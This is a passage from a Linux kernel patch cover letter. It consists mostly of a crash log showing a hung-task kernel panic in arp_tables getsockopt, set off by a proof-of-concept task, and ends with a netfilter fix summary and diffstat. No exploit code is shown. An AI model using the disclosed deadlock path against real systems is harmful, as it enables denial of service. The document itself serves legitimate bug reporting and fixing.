[  196.097310]  __mutex_lock.constprop.0 (kernel/locking/mutex.c:726 kernel/locking/mutex.c:821)
[  196.097316]  xt_find_table_lock (net/netfilter/x_tables.c:1336)
[  196.097333]  xt_request_find_table_lock (net/netfilter/x_tables.c:1378)
[  196.097340]  get_info (net/ipv4/netfilter/arp_tables.c:818)
[  196.097362]  ? avc_has_perm_noaudit (include/linux/rcupdate.h:882 security/selinux/avc.c:1164)
[  196.097370]  ? cred_has_capability.isra.0 (security/selinux/hooks.c:1668)
[  196.097377]  do_arpt_get_ctl (net/ipv4/netfilter/arp_tables.c:1465 (discriminator 1))
[  196.097382]  ? ext4_block_write_begin (fs/ext4/ext4_jbd2.h:377 fs/ext4/inode.c:1183)
[  196.097449]  ? __pfx_ext4_da_get_block_prep (fs/ext4/inode.c:603)
[  196.097455]  nf_getsockopt (net/netfilter/nf_sockopt.c:116)
[  196.097481]  ip_getsockopt (net/ipv4/ip_sockglue.c:1777)
[  196.097496]  udp_getsockopt (net/ipv4/udp.c:3060)
[  196.097519]  do_sock_getsockopt (net/socket.c:2503)
[  196.097589]  __sys_getsockopt (net/socket.c:2534 (discriminator 3))
[  196.097595]  __x64_sys_getsockopt (net/socket.c:2541 net/socket.c:2538 net/socket.c:2538)
[  196.097601]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[  196.097607]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[  196.097622] RIP: 0033:0x41d77e
[  196.097628] RSP: 002b:00007ffe1cc5b438 EFLAGS: 00000246 ORIG_RAX: 0000000000000037
[  196.097639] RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 000000000041d77e
[  196.097705] RDX: 0000000000000060 RSI: 0000000000000000 RDI: 0000000000000003
[  196.097710] RBP: 0000000000000000 R08: 00007ffe1cc5b45c R09: 0000000000000000
[  196.097715] R10: 00007ffe1cc5b460 R11: 0000000000000246 R12: 00007ffe1cc5b47f
[  196.097719] R13: 00000000000003b8 R14: 00007ffe1cc5b45c R15: 0000000000000000
[  196.097725]  </TASK>
[  196.097733] INFO: task poc-userns-trig:287 is blocked on a mutex likely owned by task poc-userns-trig:286.
[  196.097738] task:poc-userns-trig state:D stack:13616 pid:286   tgid:286   ppid:285    task_flags:0x400140 flags:0x00080000
[  196.097749] Call Trace:
[  196.097754]  <TASK>
[  196.097759]  __schedule (kernel/sched/core.c:5520 kernel/sched/core.c:7270)
[  196.097765]  schedule (kernel/sched/core.c:7347 kernel/sched/core.c:7362)
[  196.097770]  io_schedule (kernel/sched/core.c:8190)
[  196.097776]  folio_wait_bit_common (mm/filemap.c:1329)
[  196.097783]  ? __pfx_wake_page_function (mm/filemap.c:1058)
[  196.097789]  filemap_fault (mm/filemap.c:1717 mm/filemap.c:3304 mm/filemap.c:3618)
[  196.097795]  __do_fault (mm/memory.c:5565)
[  196.097810]  do_fault (mm/memory.c:6030 mm/memory.c:6136)
[  196.097825]  ? __pte_offset_map (include/linux/rcupdate.h:847 mm/pgtable-generic.c:290)
[  196.097832]  __handle_mm_fault (mm/memory.c:4700 mm/memory.c:6558 mm/memory.c:6707)
[  196.097847]  ? alloc_pages_bulk_noprof (mm/page_alloc.c:5471 mm/page_alloc.c:5295)
[  196.097863]  handle_mm_fault (mm/memory.c:6876)
[  196.097868]  ? lock_mm_and_find_vma (mm/mmap_lock.c:504)
[  196.097874]  do_user_addr_fault (arch/x86/mm/fault.c:1394)
[  196.097896]  exc_page_fault (arch/x86/mm/fault.c:1483 arch/x86/mm/fault.c:1536)
[  196.097903]  asm_exc_page_fault (arch/x86/include/asm/idtentry.h:595)
[  196.097908] RIP: 0010:_copy_to_user (arch/x86/include/asm/uaccess_64.h:126 arch/x86/include/asm/uaccess_64.h:147 include/linux/uaccess.h:202 lib/usercopy.c:24)
[  196.097928] Code: 1e fa 48 89 d1 48 89 d0 31 d2 48 01 f9 0f 92 c2 49 b8 00 f0 ff ff ff 7f 00 00 48 85 d2 75 16 49 39 c8 72 11 0f 01 cb 48 89 c1 <f3> a4 0f 1f 00 48 89 c8 0f 01 ca e9 84 26 af 00 0f 1f 40 00 90 90
All code
========
   0:	1e                   	(bad)
   1:	fa                   	cli
   2:	48 89 d1             	mov    %rdx,%rcx
   5:	48 89 d0             	mov    %rdx,%rax
   8:	31 d2                	xor    %edx,%edx
   a:	48 01 f9             	add    %rdi,%rcx
   d:	0f 92 c2             	setb   %dl
  10:	49 b8 00 f0 ff ff ff 	movabs $0x7ffffffff000,%r8
  17:	7f 00 00 
  1a:	48 85 d2             	test   %rdx,%rdx
  1d:	75 16                	jne    0x35
  1f:	49 39 c8             	cmp    %rcx,%r8
  22:	72 11                	jb     0x35
  24:	0f 01 cb             	stac
  27:	48 89 c1             	mov    %rax,%rcx
  2a:*	f3 a4                	rep movsb %ds:(%rsi),%es:(%rdi)		<-- trapping instruction
  2c:	0f 1f 00             	nopl   (%rax)
  2f:	48 89 c8             	mov    %rcx,%rax
  32:	0f 01 ca             	clac
  35:	e9 84 26 af 00       	jmp    0xaf26be
  3a:	0f 1f 40 00          	nopl   0x0(%rax)
  3e:	90                   	nop
  3f:	90                   	nop

Code starting with the faulting instruction
===========================================
   0:	f3 a4                	rep movsb %ds:(%rsi),%es:(%rdi)
   2:	0f 1f 00             	nopl   (%rax)
   5:	48 89 c8             	mov    %rcx,%rax
   8:	0f 01 ca             	clac
   b:	e9 84 26 af 00       	jmp    0xaf2694
  10:	0f 1f 40 00          	nopl   0x0(%rax)
  14:	90                   	nop
  15:	90                   	nop
[  196.097934] RSP: 0018:ffff921e802abc70 EFLAGS: 00050206
[  196.097943] RAX: 00000000000000b0 RBX: 00007fbc11bd4000 RCX: 00000000000000b0
[  196.097948] RDX: 0000000000000000 RSI: ffff8d82c6172840 RDI: 00007fbc11bd4000
[  196.097953] RBP: ffff8d82c6172840 R08: 00007ffffffff000 R09: 0000000000000000
[  196.097958] R10: 0000000000000000 R11: ffff921e801e6000 R12: ffff8d82c3793b40
[  196.097963] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[  196.098065]  do_arpt_get_ctl (include/linux/uaccess.h:230 net/ipv4/netfilter/arp_tables.c:705 net/ipv4/netfilter/arp_tables.c:877 net/ipv4/netfilter/arp_tables.c:1474)
[  196.098072]  nf_getsockopt (net/netfilter/nf_sockopt.c:116)
[  196.098073]  ip_getsockopt (net/ipv4/ip_sockglue.c:1777)
[  196.098075]  udp_getsockopt (net/ipv4/udp.c:3060)
[  196.098077]  do_sock_getsockopt (net/socket.c:2503)
[  196.098078]  __sys_getsockopt (net/socket.c:2534 (discriminator 3))
[  196.098079]  __x64_sys_getsockopt (net/socket.c:2541 net/socket.c:2538 net/socket.c:2538)
[  196.098080]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[  196.098081]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[  196.098082] RIP: 0033:0x41d77e
[  196.098083] RSP: 002b:00007ffe1cc5b438 EFLAGS: 00000246 ORIG_RAX: 0000000000000037
[  196.098083] RAX: ffffffffffffffda RBX: 00007fbc11bd3fd8 RCX: 000000000041d77e
[  196.098085] RDX: 0000000000000061 RSI: 0000000000000000 RDI: 0000000000000003
[  196.098085] RBP: 0000000000000003 R08: 00007ffe1cc5b45c R09: 0000000000000000
[  196.098086] R10: 00007fbc11bd3fd8 R11: 0000000000000246 R12: 0000000000000003
[  196.098086] R13: 00000000000003e0 R14: 00007ffe1cc5b45c R15: 0000000000000000
[  196.098087]  </TASK>
[  196.098090] Kernel panic - not syncing: hung_task: blocked tasks
[  197.306322] CPU: 0 UID: 0 PID: 31 Comm: khungtaskd Not tainted 7.2.0-15794-g1b78070aaef6 #4 PREEMPT(lazy) 
[  197.321556] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  197.341939] Call Trace:
[  197.344889]  <TASK>
[  197.347795]  vpanic (kernel/panic.c:651)
[  197.353763]  panic (kernel/panic.c:788)
[  197.358016]  watchdog (kernel/hung_task.c:356 kernel/hung_task.c:561)
[  197.362753]  ? __pfx_watchdog (kernel/hung_task.c:426)
[  197.367990]  kthread (kernel/kthread.c:436)
[  197.372480]  ? __pfx_kthread (kernel/kthread.c:948)
[  197.377354]  ret_from_fork (arch/x86/kernel/process.c:158)
[  197.402249]  ? __pfx_kthread (kernel/kthread.c:948)
[  197.415090]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[  197.422623]  </TASK>
[  197.426610] Kernel Offset: 0x6c00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)

-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  netfilter: x_tables: avoid holding mutex over faultable user copies

 net/ipv4/netfilter/arp_tables.c | 33 ++++++++++++++++++++++++++++-----
 net/ipv4/netfilter/ip_tables.c  | 33 ++++++++++++++++++++++++++++-----
 net/ipv6/netfilter/ip6_tables.c | 33 ++++++++++++++++++++++++++++-----
 3 files changed, 84 insertions(+), 15 deletions(-)

-- 
2.43.0

